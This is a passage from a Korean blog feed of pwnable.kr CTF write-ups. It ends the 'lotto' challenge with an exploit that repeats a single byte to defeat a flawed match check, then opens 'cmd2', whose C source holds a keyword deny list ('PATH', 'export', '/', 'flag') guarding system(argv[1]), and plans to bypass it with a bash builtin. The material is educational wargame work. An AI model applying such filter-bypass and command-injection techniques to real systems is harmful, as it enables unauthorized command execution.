        &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;j&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; j&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; j&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;lotto&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; submit&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;j&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
                match&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;token comment&quot;&gt;// win!&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;match &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token function&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;/bin/cat flag&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;bad luck...\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;help&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;- nLotto Rule -\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;nlotto is consisted with 6 random natural numbers less than 46\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;your goal is to match lotto numbers as many as you can\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;if you win lottery for *1st place*, you will get reward\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;for more details, follow the link below\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;mathematical chance to win this game is known to be 1/8145060.\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; argc&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; argv&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;

    &lt;span class=&quot;token comment&quot;&gt;// menu&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; menu&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;

        &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;- Select Menu -\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;1. Play Lotto\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;2. Help\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;3. Exit\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;token function&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;%d&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;menu&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;token keyword&quot;&gt;switch&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;menu&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;token keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;token function&quot;&gt;play&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;token keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;token function&quot;&gt;help&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;token keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;bye\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;token keyword&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;invalid menu\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;문제가 되게 길다. 여기서 봐야될건 &lt;code class=&quot;language-text&quot;&gt;play&lt;/code&gt;함수를 보면 된다.&lt;/p&gt;
&lt;p&gt;play는 사용자로부터 6자리를 받고, &lt;strong&gt;랜덤&lt;/strong&gt;한 값 6개를 뽑는다. 랜덤한 값은 &lt;code class=&quot;language-text&quot;&gt;1 ~ 45&lt;/code&gt;의 값을 가지게 된다.&lt;/p&gt;
&lt;p&gt;이 값과 입력한 값을 비교하는데, 매치되는지 확인하여 &lt;strong&gt;매치&lt;/strong&gt;되면 해결하는 문제이다.&lt;/p&gt;
&lt;p&gt;여기서 생각해야 할 부분은 &lt;code class=&quot;language-lotto[i] = (lotto[i] &quot;&gt; 45) + 1;&lt;/code&gt;에서 1~45를 만드는데, 이 값은 hex값이므로 사용자가 입력할 때 &lt;code class=&quot;language-text&quot;&gt;0x01 ~ 0x2D&lt;/code&gt;사이의 값을 넣으면된다.&lt;/p&gt;
&lt;p&gt;아스키값을 외우진 않지만, &lt;code class=&quot;language-text&quot;&gt;0x20&lt;/code&gt;이 공백문자임을 이용하여 해결 해준다.&lt;/p&gt;
&lt;p&gt;반복문에서 한번 검증된값을 &lt;strong&gt;재사용&lt;/strong&gt;하므로, 같은문자 한개만 넣어도 6번 맞출수 있게된다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;- Select Menu -
&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;. Play Lotto
&lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;. Help
&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;. Exit
&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;
Submit your &lt;span class=&quot;token number&quot;&gt;6&lt;/span&gt; lotto bytes &lt;span class=&quot;token builtin class-name&quot;&gt;:&lt;/span&gt;
Lotto Start&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;
sorry mom&lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;. I FORGOT to check duplicate numbers&lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;. :&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;
- Select Menu -
&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;. Play Lotto
&lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;. Help
&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;. Exit
&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;
bye&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;6개의 값중 0x20이라는 값이 한개라도 존재할때까지 계속 돌리다보면 해결할 수 있다.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Pwnable.kr cmd2]]></title><description><![CDATA[cmd1의 플래그를 패스워드로 사용하여 cmd…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Sun, 28 Aug 2016 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;cmd1의 플래그를 패스워드로 사용하여 cmd2에 접속할 수 있다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;cmd2@ubuntu&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;~&lt;/span&gt;$ cat cmd2&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;c
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;stdio.h&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;string.h&gt;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; cmd&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; r&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    r &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;strstr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;cmd&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;=&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    r &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;strstr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;cmd&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;PATH&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    r &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;strstr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;cmd&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;export&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    r &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;strstr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;cmd&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    r &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;strstr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;cmd&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;`&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    r &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;strstr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;cmd&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;flag&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; r&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; environ&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;delete_env&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; p&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;p&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;environ&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;p&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; p&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;    &lt;span class=&quot;token function&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;p&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;p&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; argc&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; argv&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; envp&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;delete_env&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;putenv&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;PATH=/no_command_execution_until_you_become_a_hacker&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;argv&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;%s\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; argv&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt; argv&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;저번 문제에서 사용했던 &lt;code&gt;&lt;b&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;/code&gt;&lt;/b&gt;&lt;/code&gt;와 &lt;strong&gt;&lt;code class=&quot;language-text&quot;&gt;/&lt;/code&gt;&lt;/strong&gt;를 사용할 수 없게 되었다.&lt;/p&gt;
&lt;p&gt;그리고 추가적으로 환경변수를 모두 제거하여 환경변수에 등록하여 사용하는 방법은 막히게 되었다.&lt;/p&gt;
&lt;p&gt;그럼 이 문제는 다른 방법으로 풀어야 하는데, 이 문제에서 사용할 수 있는 방법은 배쉬의 &lt;code class=&quot;language-text&quot;&gt;기본함수&lt;/code&gt;를 이용하는 방법이다.&lt;/p&gt;
&lt;p&gt;내가 선택한 방법은 &lt;code class=&quot;language-text&quot;&gt;read&lt;/code&gt;를 이용한 방법이다.&lt;/p&gt;
